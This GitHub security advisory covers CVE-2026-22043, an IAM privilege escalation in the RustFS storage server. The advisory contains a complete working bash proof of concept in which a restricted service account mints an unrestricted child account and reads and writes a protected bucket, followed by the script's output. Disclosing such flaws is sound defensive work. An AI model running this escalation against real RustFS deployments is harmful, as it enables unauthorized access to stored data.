# [M] RustFS has IAM deny_only Short-Circuit that Allows Privilege Escalation via Service Account Minting

## Summary
Severity: Medium
Advisory: GHSA-xgr5-qc6w-vcg9
CVE: CVE-2026-22043
CWE: CWE-269
Ecosystem: crates.io
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-01-08
Source: https://github.com/advisories/GHSA-xgr5-qc6w-vcg9
Type: github-advisory

## Affected
- crates.io: `rustfs` — affected >=1.0.0-alpha.13 <1.0.0-alpha.79

## Details
## Summary

A flawed `deny_only` short-circuit in RustFS IAM allows a restricted service account or STS credential to self-issue an unrestricted service account, inheriting the parent’s full privileges. This enables privilege escalation and bypass of session/inline policy restrictions.

## Details

**akin to MinIO CVE-2025-62506**

- Policy evaluation: `Policy::is_allowed` returns true when `deny_only=true` if no explicit Deny is hit, skipping all Allow checks (`crates/policy/src/policy/policy.rs:66-74`).
- Service account creation path sets `deny_only=true` when the target user equals the caller or its parent (`rustfs/src/admin/handlers/service_account.rs:114-127`).
- Service accounts are created without `session_policy` by default, so claims lack `SESSION_POLICY_NAME`; combined with `deny_only`, self-operations are allowed without Allow statements.
- Result: a limited service account/STS can create a new service account without policy and obtain the parent’s full rights (even root), bypassing original restrictions.

Key code references:

- `crates/policy/src/policy/policy.rs` (deny_only short-circuit)
- `rustfs/src/admin/handlers/service_account.rs:` (deny_only set for self/parent target)
- `crates/iam/src/sys.rs` (service account creation defaults, no session_policy)

## PoC

Requires `awscli`, `awscurl`, `jq`, RustFS at `http://127.0.0.1:9000`, root AK/SK `rustfsadmin/rustfsadmin`. Run:

```bash
#!/usr/bin/env bash
set -euo pipefail

# ===================== Config =====================
ENDPOINT="${ENDPOINT:-http://127.0.0.1:9000}"
ROOT_AK="${ROOT_AK:-rustfsadmin}"
ROOT_SK="${ROOT_SK:-rustfsadmin}"
PARENT_AK="${PARENT_AK:-restricted}"
PARENT_SK="${PARENT_SK:-restricted123}"
CHILD_AK="${CHILD_AK:-evilchild}"
CHILD_SK="${CHILD_SK:-evilchild123}"
AWS_REGION="${AWS_REGION:-us-east-1}"

# Tools
AWSCURL_BIN="${AWSCURL_BIN:-$HOME/Library/Python/3.13/bin/awscurl}"
AWS_BIN="${AWS_BIN:-aws}"
JQ_BIN="${JQ_BIN:-jq}"

# Disable proxies for local endpoint
export HTTP_PROXY=
export HTTPS_PROXY=
export NO_PROXY=127.0.0.1,localhost

# ===================== Helpers =====================
aws_cmd() {
  local ak="$1" sk="$2"
  shift 2
  AWS_ACCESS_KEY_ID="$ak" AWS_SECRET_ACCESS_KEY="$sk" "$AWS_BIN" --endpoint-url "$ENDPOINT" "$@"
}

awscurl_admin() {
  local ak="$1" sk="$2"
  shift 2
  AWS_ACCESS_KEY_ID="$ak" AWS_SECRET_ACCESS_KEY="$sk" \
    "$AWSCURL_BIN" --service s3 --region "$AWS_REGION" --access_key "$ak" --secret_key "$sk" "$@"
}

timestamp_iso() {
  python - <<'PY'
import datetime
print((datetime.datetime.now(datetime.timezone.utc)+datetime.timedelta(hours=1)).isoformat())
PY
}

# ===================== Cleanup =====================
echo "[+] cleanup service accounts (ignore errors)"
for ak in "$CHILD_AK" "$PARENT_AK"; do
  awscurl_admin "$ROOT_AK" "$ROOT_SK" -X DELETE "$ENDPOINT/rustfs/admin/v3/delete-service-accounts?accessKey=$ak" >/dev/null 2>&1 || true
done

echo "[+] cleanup buckets"
for b in bucket1 bucket2 bucket3; do
  aws_cmd "$ROOT_AK" "$ROOT_SK" s3 rb "s3://$b" --force >/dev/null 2>&1 || true
done

# ===================== Setup =====================
echo "[+] create buckets"
for b in bucket1 bucket2 bucket3; do
  aws_cmd "$ROOT_AK" "$ROOT_SK" s3 mb "s3://$b" || true
done

echo "[+] seed bucket3 with marker object"
printf "poc-marker\n" | aws_cmd "$ROOT_AK" "$ROOT_SK" s3 cp - s3://bucket3/poc-marker.txt

EXP="$(timestamp_iso)"

echo "[+] create restricted policy"
RESTRICTED_POLICY='{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:ListBucket"],
      "Resource": ["arn:aws:s3:::bucket1", "arn:aws:s3:::bucket2"]
    },
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Resource": ["arn:aws:s3:::bucket1/*", "arn:aws:s3:::bucket2/*"]
    }
  ]
}'

echo "[+] create restricted service account"
awscurl_admin "$ROOT_AK" "$ROOT_SK" -X PUT "$ENDPOINT/rustfs/admin/v3/add-service-accounts" \
  -H 'Content-Type: application/json' \
  -d "$("$JQ_BIN" -nc --arg ak "$PARENT_AK" --arg sk "$PARENT_SK" --arg policy "$RESTRICTED_POLICY" --arg exp "$EXP" \
      '{accessKey:$ak, secretKey:$sk, policy:$policy, name:"restricted-sa", expiration:$exp}')" \
  > /tmp/restricted_sa.json
cat /tmp/restricted_sa.json

echo "[+] list buckets as restricted (expect bucket1,bucket2 only)"
aws_cmd "$PARENT_AK" "$PARENT_SK" s3 ls

echo "[+] create child service account without policy (trigger deny_only)"
awscurl_admin "$PARENT_AK" "$PARENT_SK" -X PUT "$ENDPOINT/rustfs/admin/v3/add-service-accounts" \
  -H 'Content-Type: application/json' \
  -d "$("$JQ_BIN" -nc --arg ak "$CHILD_AK" --arg sk "$CHILD_SK" --arg exp "$EXP" \
      '{accessKey:$ak, secretKey:$sk, name:"child-sa", expiration:$exp}')" \
  > /tmp/child_sa.json
cat /tmp/child_sa.json

echo "[+] child tries to list bucket3 (should be denied; success means vuln)"
if aws_cmd "$CHILD_AK" "$CHILD_SK" s3 ls s3://bucket3; then
  echo "child list bucket3: SUCCESS (vuln)"
else
  echo "child list bucket3: DENIED"
fi

echo "[+] child tries to read marker from bucket3"
if aws_cmd "$CHILD_AK" "$CHILD_SK" s3 cp s3://bucket3/poc-marker.txt /tmp/poc-marker.txt; then
  echo "child read marker: SUCCESS (vuln). Content:"
  cat /tmp/poc-marker.txt
else
  echo "child read marker: DENIED"
fi

echo "[+] child tries to write new object into bucket3"
if printf "child-write\n" | aws_cmd "$CHILD_AK" "$CHILD_SK" s3 cp - s3://bucket3/child-write.txt; then
  echo "child write: SUCCESS (vuln)"
else
  echo "child write: DENIED"
fi

```

PoC steps (in `poc.sh`):

1) Cleanup old test accounts/buckets; create bucket1/2/3; seed bucket3 with `poc-marker.txt`.
2) Create restricted policy (List/Get/Put only on bucket1/2).
3) Create restricted service account `restricted/restricted123` with that policy.
4) With `restricted`, create child service account `evilchild/evilchild123` **without policy** (deny_only short-circuit).
5) With `evilchild`, list bucket3 and read/write objects (expected to be denied; success demonstrates vuln). Script prints SUCCESS/DENIED.

Result:

```text
./poc.sh
[+] cleanup service accounts (ignore errors)
[+] cleanup buckets
[+] create buckets
make_bucket: bucket1
make_bucket: bucket2
make_bucket: bucket3
[+] seed bucket3 with marker object
[+] create restricted policy
[+] create restricted service account
{"credentials":{"accessKey":"restricted","secretKey":"restricted123","expiration":"2025-12-16T11:51:18.049076Z"}}
[+] list buckets as restricted (expect bucket1,bucket2 only)
2025-12-16 18:51:16 bucket1
2025-12-16 18:51:16 bucket2
[+] create child service account without policy (trigger deny_only)
{"credentials":{"accessKey":"evilchild","secretKey":"evilchild123","expiration":"2025-12-16T11:51:18.049076Z"}}
[+] child tries to list bucket3 (should be denied; success means vuln)
2025-12-16 18:51:17         11 poc-marker.txt
child list bucket3: SUCCESS (vuln)
[+] child tries to read marker from bucket3
download: s3://bucket3/poc-marker.txt to ../../../../../tmp/poc-marker.txt
child read marker: SUCCESS (vuln). Content:
poc-marker
[+] child tries to write new object into bucket3
child write: SUCCESS (vuln)
```

## Impact

Privilege escalation / authorization bypass. Any holder of a restricted service account or STS credential can mint an unrestricted service account and gain parent-level (up to root) access across S3/Admin/KMS operations. High risk to confidentiality and integrity.

## References
- https://github.com/rustfs/rustfs/security/advisories/GHSA-xgr5-qc6w-vcg9
- https://nvd.nist.gov/vuln/detail/CVE-2026-22043
- https://github.com/rustfs/rustfs
